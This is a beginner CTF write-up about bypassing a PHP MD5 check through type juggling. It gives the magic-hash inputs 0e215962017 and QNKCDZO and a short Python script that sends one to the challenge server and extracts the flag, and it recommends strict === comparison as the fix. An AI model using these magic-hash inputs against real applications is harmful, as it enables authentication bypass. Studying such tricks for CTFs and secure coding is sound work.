---
title: "Confuse Me — PHP Magic Hash 0e MD5 Bypass"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "php", "type-juggling", "md5", "python"]
difficulty: "beginner"
summary: "PHP's loose == treats any string starting with '0e' followed by digits as the float 0. Pass a known magic hash input whose MD5 begins with 0e to bypass a hash comparison."
---

## The Challenge

The server compares an MD5 hash with a stored value using `==`. Because PHP's loose comparison coerces strings that look like scientific notation to floats, any MD5 that starts with `0e` followed only by digits evaluates to `0` — and matches any other `0e...` hash.

## Approach

`0e215962017` is a well-known "magic hash" input: its MD5 is `0e291242476940776845150308577824` — a string starting with `0e` and all digits after. Any stored hash that is also a `0e...` string compares equal via `==`. Pass this input as the query parameter `input`.

## Solution

```python
import requests
''' https://stackoverflow.com/questions/40361567/manipulate-bypass-md5-in-php '''
t = requests.get("http://confuse-me.challs.olicyber.it/?input=0e215962017").text
i = t.find("flag")
e = t.find("}")
print(t[i:e+1])
```

The comment links to a Stack Overflow answer listing known PHP magic hash values. `?input=0e215962017` sends the magic input. `t.find("flag")` + `t.find("}")` extracts the flag substring from the HTML response.

## What I Learned

PHP magic hashes are a consequence of `==` coercing `"0e291242476..."` to `float(0)`. The fix is always `===` (strict comparison) which compares type and value without coercion, and never `==` for security checks. A table of known `0e` MD5 inputs (e.g. `QNKCDZO`, `0e215962017`) should be in every web CTF toolkit.
